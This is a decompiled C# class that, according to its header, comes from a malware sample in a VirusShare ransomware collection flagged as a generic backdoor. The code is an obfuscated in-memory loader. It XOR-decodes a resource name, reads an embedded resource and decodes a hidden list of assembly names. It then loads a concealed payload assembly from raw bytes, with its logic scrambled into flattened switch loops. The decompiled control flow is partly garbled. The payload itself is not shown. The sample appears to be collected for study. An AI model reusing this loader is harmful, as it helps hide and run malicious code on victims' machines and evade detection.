// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Protected, Version=6.2.8400.0, Culture=neutral, PublicKeyToken=null
// MVID: 52CBE997-50C3-42B2-A704-C908D57869A5
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-2a8dca5794c095ea67845468a3fd0a8e91a24bf3f0bb5e0ec6c16a6579cc4e90.exe

using System;
using System.IO;
using System.Reflection;
using System.Threading;

internal class \uE023
{
  private static Assembly \uE000;
  private static object \uE001 = new object();
  private static int \uE002;
  private static string[] \uE003;
  private static \uE023.\uE000 \uE004 = new \uE023.\uE000(\uE023.\uE000);

  public static void \uE000()
  {
    if ((\uE023.\uE002 == 0 ? 0 : 1) != 0)
      return;
    try
    {
      Monitor.Enter(\uE023.\uE001);
      if ((\uE023.\uE002 == 0 ? 0 : 1) != 0)
        return;
      AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\uE023.\uE000);
      \uE023.\uE002 = 1;
    }
    finally
    {
      Monitor.Exit(\uE023.\uE001);
    }
  }

  public static string \uE000()
  {
    char[] charArray = "çòÚóà".ToCharArray();
    int length = charArray.Length;
    while (--length >= 0)
      charArray[length] = (char) ((uint) charArray[length] ^ 151U);
    return new string(charArray);
  }

  public static Assembly \uE000(object _param0, ResolveEventArgs _param1)
  {
    if ((\uE023.\uE003 == null ? 0 : 1) == 0)
    {
      try
      {
        Monitor.Enter(\uE023.\uE001);
        if ((\uE023.\uE003 == null ? 0 : 1) == 0)
        {
          Stream manifestResourceStream = typeof (\uE023).Assembly.GetManifestResourceStream(\uE023.\uE004());
          if ((manifestResourceStream == null ? 1 : 0) == 0)
            \uE023.\uE000 = \uE023.\uE000(manifestResourceStream);
        }
      }
      finally
      {
        Monitor.Exit(\uE023.\uE001);
      }
    }
    return (!\uE023.\uE000(_param1.Name) ? 1 : 0) == 0 ? \uE023.\uE000 : (Assembly) null;
  }

  private static Assembly \uE000(Stream _param0)
  {
    BinaryReader binaryReader = new BinaryReader((Stream) \uE031.\uE000(_param0));
label_2:
    int num1 = 115;
    int count;
    string[] strArray;
    while (true)
    {
      char[] chArray;
      int index1;
      string str;
      int index2;
      switch (num1 ^ 49)
      {
        case 61:
          index1 = 0;
          num1 = 117;
          continue;
        case 62:
label_4:
          chArray[index1] = (char) ((uint) str[index1] ^ 3680U);
          num1 = 119;
          continue;
        case 63:
          if (index2 != 0)
          {
            num1 = 113;
            continue;
          }
          goto label_17;
        case 64:
label_7:
          str = binaryReader.ReadString();
          num1 = 112;
          continue;
        case 65:
          chArray = new char[str.Length];
          num1 = 12;
          continue;
        case 66:
          count = binaryReader.ReadInt32() ^ 1151007021;
          num1 = 116;
          continue;
        case 67:
          index2 = 0;
          num1 = 14;
          continue;
        case 68:
          if (index1 != 0)
          {
            num1 = 15;
            continue;
          }
          break;
        case 69:
          strArray = new string[count];
          num1 = 114;
          continue;
        case 70:
          ++index1;
          break;
        default:
          goto label_2;
      }
      if (index1 >= chArray.Length)
      {
        strArray[index2] = new string(chArray);
        ++index2;
      }
      else
        goto label_4;
label_17:
      if (index2 < count)
        goto label_7;
      else
        break;
    }
    \uE023.\uE003 = strArray;
label_20:
    int num2 = 22;
    byte[] numArray;
    while (true)
    {
      switch (num2 ^ 57)
      {
        case 45:
          numArray = new byte[count];
          num2 = 23;
          continue;
        case 46:
          binaryReader.Read(numArray, 0, count);
          num2 = 9;
          continue;
        case 47:
          count = binaryReader.ReadInt32() ^ 2123337536;
          num2 = 20;
          continue;
        case 48:
          goto label_24;
        default:
          goto label_20;
      }
    }
label_24:
    return Assembly.Load(numArray);
  }

  private static bool \uE000(string _param0)
  {
    if ((\uE023.\uE003 == null ? 1 : 0) == 0)
    {
      string[] strArray = \uE023.\uE003;
label_7:
      int num1 = 17;
      int num2 = 15;
      while (true)
      {
        switch (num2 ^ 51)
        {
          case 58:
            int index;
            string str;
            int num3;
            switch (num1)
            {
              case 57:
label_8:
                str = strArray[index];
                num1 = 22;
                goto label_2;
              case 58:
                if (index != 0)
                {
                  num1 = 20;
                  goto label_2;
                }
                else
                  goto label_19;
              case 59:
                if (_param0.Equals(str))
                {
                  num1 = 16;
                  goto label_2;
                }
                else
                {
                  num3 = 1;
                  break;
                }
              case 60:
                index = 0;
                num1 = 23;
                goto label_2;
              case 61:
                num3 = 0;
                break;
              default:
                num2 = 8;
                continue;
            }
            if (num3 != 0)
              ++index;
            else
              goto label_17;
label_19:
            if (index < strArray.Length)
              goto label_8;
            else
              goto label_20;
          case 59:
            goto label_7;
          case 60:
label_2:
            num1 ^= 45;
            break;
        }
        num2 = 9;
      }
label_17:
      return true;
    }
label_20:
    return false;
  }

  private delegate string \uE000();
}
